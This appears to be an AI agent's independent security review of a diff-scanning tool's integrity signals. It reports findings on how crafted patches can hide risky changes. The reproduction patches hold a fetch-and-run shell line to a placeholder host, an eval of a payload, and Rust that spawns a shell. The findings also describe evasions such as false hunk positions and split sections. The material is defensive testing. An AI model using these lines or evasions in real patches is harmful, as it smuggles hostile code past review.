# Seventh independent review of the integrity signals: commit `87d1afd` (2026-11-15)

Reviewer: a fresh Claude agent that took no part in the work. Brief:
`~/.local/state/habitat-claude/ddf-gap-probes-20261113/ddf-independent-review-7-brief.md`.
Read: `8f290e3..87d1afd` (and the feature `d4dbc91..87d1afd` where a rule reached back),
the request `docs/reviews/vesper-v3-round14-request-20261115.md`, the code named in the brief.
Binaries: the frozen `v3r14` (SHA-256 `11ae63e4…`), `v3r14-first`, `v3r13`, `v3r12`, and the
published v0.8.3 (called `x` in outputs below, from its directory name). Git 2.56.0. No
`cargo` was run. Vesper's round 14 report exists in this directory; I did not open it.

Scratch, notes and every reproduction: `/tmp/claude-ddf-indep-review-7/`
(`NOTES.md`; `findings/` holds each finding's patch and `findings/repro.sh`, which builds a
scratch repository and prints every output quoted here).

## Verdict: NO-GO

Two high findings, both reproduced, both taken from the patch writer's word in a place this
round did not look:

- the **language of a file with no extension** is now decided by the hunk's OLD position, and
  one false number makes this commit report nothing where the published v0.8.3 and round 13
  report a fetch and an `eval` (claims 2 and 3 broken, and claim 1's "subset of round 13"
  outside Rust);
- a **second section for the same path** carries on a construct that the first section
  began, plain `git apply` puts the two together, and nothing joins them (the hunk-boundary
  finding of the sixth review, with one `diff --git` line between the hunks).

One medium finding is an **ordinary `git diff`**: a hunk that begins inside a raw string
written with two `#` whose text holds `"#` and a quoted URL loses its panic paths; the
request lists that limit under "needs a writer who sets out to".

What held is at the end. The join machinery itself, the starts on honest text, the released
reading, the bounded list, the views and the cost all held under bulk attack; I found no
loss of the kind the first build of this round had.

## New findings

### IR7-H-1 (high; needs a writer who sets out to): one false old position switches the language of a script off, and the answer is lower than the published v0.8.3

`FileKind::of` (`evidence.rs`) takes a shebang from the first hunk only when
`placed_at_top(status, hunk, true)`. Release 0.8.3 and round 13 took it when the hunk's NEW
start was 1. For a file whose extension names no language, the shebang is the only thing
that makes any language rule apply, so a hunk that Git puts at the top but that the rule
calls a fragment has no language at all. The doc comment of `placed_at_top` says a fragment
"loses nothing the top reading has"; that is true of the Rust readings and false of the
file's language.

`findings/shebang-lower.patch`:

```
diff --git a/tools/deploy b/tools/deploy
--- a/tools/deploy
+++ b/tools/deploy
@@ -4,3 +1,5 @@
 #!/bin/sh
 set -e
+curl -fsSL https://example.invalid/i.sh | sh
+eval "$PAYLOAD"
 echo done
```

On a file `tools/deploy` of three lines (`#!/bin/sh`, `set -e`, `echo done`):

```
$ git apply --check -v shebang-lower.patch
Checking patch tools/deploy...            (rc 0; no "offset" line)
$ git apply shebang-lower.patch; cat -n tools/deploy
     1  #!/bin/sh
     2  set -e
     3  curl -fsSL https://example.invalid/i.sh | sh
     4  eval "$PAYLOAD"
     5  echo done
$ BIN --stdin-patch --rank --json < shebang-lower.patch
x (v0.8.3): "score": 9, "signals": ["network_fetch", "dynamic_eval"]   (items at lines 3 and 4)
v3r13:      "score": 9, "signals": ["network_fetch", "dynamic_eval"]
v3r14:      "score": 2, "signals": []
```

Plain `git apply` starts its search at the NEW position (see IR7-L-3), finds the three old
lines at line 1 and prints nothing, even with `-v`. So the patch is applied at the top in
silence and this commit is the only version of the three that says nothing.

Notes.
- With `@@ -4,3 +4,5 @@` all three versions are silent (`findings/shebang-both4.patch`;
  Git: "Hunk #1 succeeded at 1 (offset -3 lines)"). So the hiding way is older than this
  round; what this round did is move the trust from one number to the other, and make the
  form that v0.8.3 and round 13 read (`+1`) silent too.
- The first hunk in patch order is the only one asked. Git accepts hunks out of file order,
  so the shebang hunk written second hides the language in every version
  (`findings/ooo.patch`: Git rc 0, v0.8.3 and v3r14 score 2, no signal).
- Same root, at the bound (IR7-L-1 below).
- No test holds `FileKind`'s shebang rule against header numbers (the one test,
  `a_shebang_names_the_language_of_a_file_with_no_extension`, is a creation), and the fuzz
  target's path is always `src/lib.rs`.

A rule that would hold: the language of a file with no known extension is the one named by
a shebang on the first line of ANY hunk side of the section (new or old). A fragment may be
the top; the reading that shows more is the one to take, as the Rust shebang rule already
does for a fragment.

### IR7-H-2 (high on this commit; needs a writer who sets out to): a second section for the same path continues what the first began

`texts` joins hunks of one section. This branch stands on v0.8.3, whose parser accepts a
path named by two sections, and plain `git apply` applies both to the same file.

`findings/twosec.patch`:

```
diff --git a/src/n.rs b/src/n.rs
new file mode 100644
--- /dev/null
+++ b/src/n.rs
@@ -0,0 +1,2 @@
+pub fn f(opt: Option<u32>) -> u32 {
+    let v = opt.unwrap
diff --git a/src/n.rs b/src/n.rs
--- a/src/n.rs
+++ b/src/n.rs
@@ -9,0 +3,3 @@
+    ();
+    v
+}
```

```
$ git apply --check -v twosec.patch       (rc 0)
$ git apply twosec.patch; cat -n src/n.rs
     1  pub fn f(opt: Option<u32>) -> u32 {
     2      let v = opt.unwrap
     3      ();
     4      v
     5  }
$ rustc --edition 2021 --crate-type lib src/n.rs        (0 errors; findings/twosec-result.rs)
$ v3r14 --stdin-patch --rank --json < twosec.patch
"path": "src/n.rs", "status": "added", "score": 4, "signals": ["new_file"]
"path": "src/n.rs", "status": "modified", "score": 2, "signals": []
```

The same works for a comment or a string opened at the end of the first section. It is the
sixth review's IR6-H-3 with a header line between the two hunks, and the fifth round's
VD3R5-H-1 in another place. The released-line work refuses a second section for one path
(0.8.4); that refusal is not on this branch, is not named in this commit's documents as
something the join rule depends on, and no test here holds it. Either state the dependency
and add this file as a test that must be refused after the rebase, or join across sections
of one path.

### IR7-M-1 (medium; an ordinary diff can do this): a raw string with two `#` whose text holds `"#`

`first_quote_hashes` takes the number of `#` from the first quote of the side that has any.
In a side that began inside `r##"…"##` the string's own text may hold `"#` (that is what
the second `#` is for: `href="#top"`, `"#fff"`), so the count is 1, the raw start ends the
string at the wrong quote, and when the text also holds `//` between quotes (any URL) the
ordinary-string start loses step too. No reading then has the code after the string.

`findings/html.patch` is the plain output of `git diff` (three lines of context) for a test
file; `findings/html-full.patch` is the same change with `-U40`:

```
@@ -11,6 +11,7 @@ fn links_are_counted() {
 <a href="#top">Top</a>
 <a href="https://example.com/docs">Docs</a>
 "##;
-    let n = parse(html);
-    assert!(n.is_ok());
+    let n = parse(html).unwrap();
+    let out = std::process::Command::new("true").status().unwrap();
+    assert!(n > 0 && out.success());
 }
```

```
html.patch       x (v0.8.3): process_spawn@15                                   score 3
                 v3r12:      panic_path_added@14, process_spawn@15, panic_path_added@15   score 5
                 v3r13:      nothing                                            score 1
                 v3r14:      process_spawn@15 (from the released reading only)  score 3
html-full.patch  v3r14:      panic_path_added@14, process_spawn@15, panic_path_added@15   score 5
```

The file compiles and its test passes (`raw/r/tests/page.rs`, `rustc --test`). Round 12
found both panic paths; rounds 13 and 14 do not. The request and the README state this
limit accurately as a mechanism and wrongly as a class: it is under "needs a writer who
sets out to".

How often: on all 18,699 `.rs` files of the 603 crates here, 6,507 raw strings with a `#`
run over lines, 75 of them hold `"#`; cutting a hunk three lines before each one's end,
with the six lines after it as the change, v3r14 misses 0 of 226 true items (v3r13: 53;
`bulk/rawscan.out`). So it is rare in that code and ordinary in HTML or Markdown fixtures.

A sound and cheap rule: the quote that closes the raw string a side began in has more `#`
after it than any quote before it in the side. So the closer is one of the quotes that set
a new record of `#`; one raw start for each record count (a handful at most; bound it and
declare the bound) is exact for every count. The fuzz target cannot build this case: its
raw string unit takes "no quote in its text".

### IR7-M-2 (medium; needs a writer who sets out to; applier `git apply --unidiff-zero`): the join by position misses a pair whose first hunk has no old line

`texts` enters only hunks WITH old lines in `ends_before`. A hunk of added lines only that
says "after line N", followed by a hunk that starts at old line N+1, is not joined, though
their old positions say they touch; the same two roles in the other order are joined.

`findings/pq.patch` (true positions) and `findings/qp.patch`:

```
@@ -2,0 +3,1 @@
+    let v = opt.unwrap
@@ -3,1 +4,1 @@
-    let b = 2;
+    (); let b = v;
```

```
$ git apply --check pq.patch                    (refused: plain Git wants the first hunk at the end)
$ git apply --unidiff-zero --check pq.patch     (rc 0; lines 3 and 4 of the result are the two halves; compiles)
pq.patch v3r14: "score": 2, "signals": []
qp.patch v3r14: "score": 5, "signals": ["panic_path_added"]   (line 2, basis hunk)
```

The documents say the reading of every hunk alone is the reading for an applier that
believes positions; for that applier this pair is believed to touch and is read apart. A
real `git diff -U0` writes the two as one hunk. Not in the list of remaining ways (the
listed pair is "the second's position says they do not").
Fix: enter a hunk with no old line in `ends_before` at `start + 1`.

### IR7-M-3 (medium; needs a writer who sets out to; as old as v0.8.3): white space or a line end inside a path hides the three heaviest Rust signals, and the list of remaining ways does not say so

The rules for `process_spawn` and `network_fetch` in Rust are still exact substrings on one
line (`Command::new`, `process::Command`, `TcpStream::connect`, `reqwest::`, …). The
integrity signals and `check_suppressed` were given spaced and many-line reading in this
feature because spellings hid them; these were not. Each of these is a created file of one
hunk, compiles (`rustc --edition 2021 --crate-type lib`, 0 errors) and is silent in v0.8.3
and in v3r14 alike (score 4, `new_file` only):

```
sp1  pub fn f() { let _ = std::process :: Command :: new("sh").spawn(); }
sp3  pub fn f() { let _ = std::process::        (next line)  Command::   (next line)  new("sh").spawn(); }
sp4  pub fn f() { let _ = std::net::TcpStream :: connect("1.2.3.4:80"); }
sp7  use std::{process::*};   pub fn f() { let _ = Command   (next line)  ::new("sh").spawn(); }
```

Nothing is lower than v0.8.3 here. The finding is that "every remaining way known" is not
every way: this one needs no hunk trick, no false number and no comment, and the reader of
tokens that would close it is already in the tree.

### IR7-L-1 (low; needs a writer who sets out to): outside Rust the `released` mark is "found today in the hunk alone", which is not what v0.8.3 listed when the two versions disagree on the language

`findings/bound-lang.patch`: the script of IR7-H-1 with the header `@@ -1,3 +5,39 @@`
(Git: applied at line 1), 34 `curl … | sh` lines and then a token. v0.8.3 has no language
for it (new start 5) and lists its one item, `secret_like` at line 42. v3r14 reads shell
(old start 1), marks 34 `network_fetch` items as released, and its list of 32 does not hold
the secret (`signals` does; `evidence_truncated` is true). "Its items keep their places" is
false for this file. Same root as IR7-H-1.

### IR7-L-2 (low): a view of one hunk in a file with many joined hunks pays for the file, and `git diff -U0` writes such files

`--hunks --address A` for one hunk, 330,000 hunks in the file (`cost/`):

```
creation in 330,000 hunks       v3r13 1.14 s, 128 MB    v3r14 4.01 s, 264 MB
touching by position            v3r13 1.22 s, 153 MB    v3r14 5.20 s, 328 MB
added-only hunks, -U0 shape     v3r13 1.07 s, 130 MB    v3r14 3.93 s, 266 MB
```

It is linear, and it is VD3R10-M-1 again for joined hunks: each request scans the whole
file. The third row is what `git diff -U0` writes: there every hunk ends in a changed line,
so every hunk of added lines is "must"-joined to the hunk before it. The README says "with
context lines" and is right; the doc comments of `texts` ("`git diff` writes neither") and
of `shown_labels` and its test ("`git diff` writes no such hunks") are not. On this
repository's history regenerated with `-U0` (483 patches) the joins changed one item.

### IR7-L-3 (low; documents): the model of `git apply` in the documents has the two numbers the wrong way round

README: "the new position is never used to place a hunk: `@@ -9,4 +1,5 @@` is applied at
line 9". `placed_at_top`: "plain `git apply` looks for the hunk's old lines, starting near
the old position". The CHANGELOG and the fuzz target say the same. In Git 2.56.0
(`apply_one_fragment`: `pos = frag->newpos ? frag->newpos - 1 : 0`) the search starts at
the NEW position; the old position is read only to see whether it is 0 or 1. With the same
four lines at 1 to 4 and at 9 to 12 of a file (`findings/dup-*.patch`):

```
@@ -9,4 +1,5 @@   applied at line 1   (no message)
@@ -2,4 +9,5 @@   applied at line 9   (no message)
@@ -1,4 +9,5 @@   applied at line 1   ("offset -8 lines" with -v)
```

The rule in the code (top = old position 0, or 1 with an old line) is right. What follows
from the true model: (a) for plain `git apply` an old position of 2 or more is decoration,
so the join "by old position" depends only on a number the applier never reads (claim 3
holds because the join only adds, not because the number means anything); (b) a false old
position leaves no trace at all when the new position is true: no offset is printed, even
with `-v`. That is the price of the declared false-position pair (below).

### IR7-L-4 (low): tests and the fuzz target

- `rust_hunk_places` builds added lines only in rules 1, 2, 3 and 5; no hunk with old lines
  is ever joined by position; no other language; the bound of 32 is never reached
  (`file_evidence` is asked, not the list); the path is fixed; hunks are in file order; one
  section. Raw strings have no quote in their text. Inputs it cannot catch, where the code
  is wrong: `findings/shebang-lower.patch`, `twosec.patch`, `pq.patch`, `html.patch`.
  Inputs of the same kinds where the code is right (checked by hand): a removed `#[` /
  `test` / `]` over two hunks that touch, in both patch orders (`j/rm.patch`,
  `j/rm-rev.patch`: `test_removed` found, v3r13 none); a position join and a must join out
  of patch order (`j/mix.patch`); a Python file created in three hunks (`j/py.patch`).
- No unit test would fail if `FileKind::of` went back to the new number, or forward to any
  hunk (IR7-H-1).
- `hunk_signals` finds its hunk by pointer and falls back to the hunk alone in silence when
  the caller passes a copy; only a test calls it today.

### IR7-L-5 (low; wording): "round 13's answers are a subset" is not true of the printed list

With lists compared item by item, 13 of the 483 history patches list fewer of round 13's
items (panic paths that made room for the release's items). By design; say so.

## The claims of the request

1. **Monotone: held**, with the exceptions above. By reading, `texts` always has every hunk
   alone and `unite` drops nothing. By bulk: 587 real crate files as creations cut into 2,
   3, 6 and 12 hunks under four header modes (no cut answer below the whole, none below
   v3r13, none below v0.8.3 with lists compared and scores); 26,306 hunks with context from
   2,500 files; three history sets of 483 patches (`-U3`, `-U1`, `-U0`) and 242 reversed
   ones for the removed side; 1,814 reproduction patches of the earlier reviews with
   scores. v3r13 to v3r14 lost only `h/asym.patch` and its copies. **Broken outside Rust**
   by IR7-H-1 (round 13 found the fetch and the `eval`).
2. **Never lower than v0.8.3: broken** by IR7-H-1 (score, signals, items) and IR7-L-1 (the
   list). For Rust it held everywhere I looked: `lexical/legacy_rust.rs` is lines 119 to
   841 of `lexical.rs` at `d4dbc91` byte for byte (only the 26-line head is added), the
   `Language` methods it calls are unchanged, `legacy_views` feeds each side as
   `hunk_matches` of that commit did, and the rule table for the nine signals is unchanged
   outside Rust.
3. **Placement is Git's: broken** by IR7-H-1 (the language) and IR7-H-2 (sections). The
   Rust top rule held against Git as I ran it: a later hunk cannot take an earlier hunk's
   lines as context (refused), so a hunk of added lines after one that ends its file can
   stand nowhere else; hunks out of file order are accepted; a `\ No newline` marker
   followed by more lines of that side, which Git joins into one line, is refused by the
   parser.
4. **Rounds 11 to 13 stand: held.** Other languages: 369 Python, 388 JS, 70 TS, 400 Go,
   220 shell, 121 YAML and 186 scripts with no extension, as whole files, single hunks, cut
   creations and touching hunks with true positions: v3r14 equals v3r13 where nothing is
   joined, and is never below it or v0.8.3 (`bulk/lang-*`). Cost: linear; 1.2 to 1.85 times
   round 13 on the sixth review's ten inputs with memory mostly lower; 330,000 hunks 1.6 to
   1.8 times the time and 1.55 to 1.7 times the memory.
5. **The corpus says what the binary does: held** for the figures: the frozen binary prints
   49 cases, 134/153, 134/187, 75 declared, as `eval.rs` has them.

Views against the rank: on 615 files (cut creations and three touching hunks, some out of
order) the labels of `--outline`, `--hunks` and `--hunks --address` equal the rank's items
for every hunk; `--cluster --parallel 1` and `4` equal the rank on the hand-made joins.

## The starts

On 26,306 hunks cut from real files (1 to 20 changed lines, 0, 1 or 3 lines of context)
v3r14 misses none of 2,467 true items in any true start (code 25,657 hunks; comment 297;
ordinary string 81; raw string 271), adds one false item, and is nowhere below v3r13 (which
missed 4) or v0.8.3 (`bulk/frag-7102.out`). The one start that guesses is the raw string's
count of `#`: IR7-M-1.

## The declared limits

- **Two hunks that touch while the second's position says they do not.** Stated accurately.
  It costs one digit that plain `git apply` never reads, and nothing is printed
  (`findings/cutpair.patch`: `let v = opt.unwrap`, a blank context line, then a hunk
  `@@ -40,2 +5,3 @@` that begins `();`; `git apply --check -v` rc 0 and no offset line; it
  compiles; v3r14 silent; with `-4,2` it is found). An honest author cannot hit it. In
  substance the sixth review's hunk-boundary finding is closed for a creation and for a
  writer who keeps the numbers true, and open for anyone else. A sound rule exists, see
  below.
- **A string start with nothing carried over a line end.** Accurate; a writer's work. An
  honest author can lose only the line that closes the string, and only with an odd quote
  in a comment after it. None in my sample.
- **Two or more comments deep.** Accurate. Commenting out a block that holds block comments
  is ordinary Rust, so an honest hunk can begin two deep, but to lose an item the text must
  also hold an odd quote or a `//` before the outer end. None in my sample began two deep.
- **A raw string: no `#` and a backslash before the closing quote; text that holds `"#`.**
  The first is rare and honest (`r"C:\dir\"`) or a writer's. The second is ordinary:
  IR7-M-1.
- **Old position 1 with old lines, applied lower by `--unidiff-zero` or `-C0`.** Accurate
  for plain Git (`@@ -1,4 +9,5 @@` went to line 1). I did not run `-C0`.
- **The ordinary ones** (part of a construct, removal only, macro or alias, 64 generic
  tokens, four lint spellings, fragments of other languages, the bound). Accurate as far
  as I tested. For the bound a design that keeps both properties: the release's 32, and up
  to one more place for each signal that has none (a list of at most 46).
- **Missing from the list:** the language of a file with no extension (IR7-H-1, and hunk
  order); a second section for the path (IR7-H-2); a hunk of added lines before a hunk at
  the next old line (IR7-M-2); a spaced or split path of the release's signals (IR7-M-3).
- **Full context has no unknown start:** true as stated (`html-full.patch` gives all three
  items).

## The option not taken

The reasoning is right: Git accepts hunks out of file order (run), so a chain in patch
order is one more guess, stepped round by reordering, and it would cost the view of one
hunk its property everywhere. But the reason the false-position pair matters is that the
number it turns on is not read by the applier, so no rule built on numbers will close it.
A rule that needs no number: treat the EDGE of a hunk side as unknown text, as the start
already is. When the last token of a side (white space and comments passed over) is an
anchor word in its construct with the rest missing (`.unwrap`, `.expect`, `todo`, `#[` …
`ignore` without `]`), report it with basis `hunk`: whatever stands beyond the edge may
complete it. Any cut of a construct leaves the anchor at an edge of one half, whatever the
numbers, the order of the hunks or the applier. Formatted code never ends a hunk side
between `unwrap` and `(`, so the false items should be near none; measure it on the 177,957
fragments before taking it.

## False positives: the figure I checked

History, 483 patches, through the printed lists: v3r14 lists 26 distinct items that v3r13
does not. 13 are true items that the new order of the list brought in (they were cut
before). 7 are text of strings found by the released reading (three copies of a help text
"unsafe code, network access…", three in a test fixture's patch text, one spawn in the
source of a probe program kept in a raw string). 5 are panic paths in that same probe
source (`council_sandbox.rs`), found by the string start in a hunk that begins in code.
1 is real (`json.rs:517`). That agrees with the
request's 1 real, 21 and 9 as far as lists of 32 can show. One file's score went from 7 to
11 on a line of help text; v0.8.3 scores it the same way.

## Weak tests

See IR7-L-4. In addition: nothing in the gate applies a patch with Git and compares where
the hunks went with what `placed_at_top` and `texts` say; the Git runs are in doc comments,
and two of the sentences there are wrong (IR7-L-3).

## What I did not look at

The daemon over a socket and the MCP transport (only the CLI views and `--cluster`);
editions before 2021; frontmatter; lines ending in a carriage return; `git apply -C0`,
`--3way`, `git am` and GNU `patch`; the mutation score; the unit tests as run (no `cargo`);
the removed side in bulk beyond the reversed history and the hand cases; whether the
0.8.4 refusal, once rebased onto, closes every form of IR7-H-2 (a rename of a file the
patch created, for one). Vesper's round 14 report was left unread on purpose.
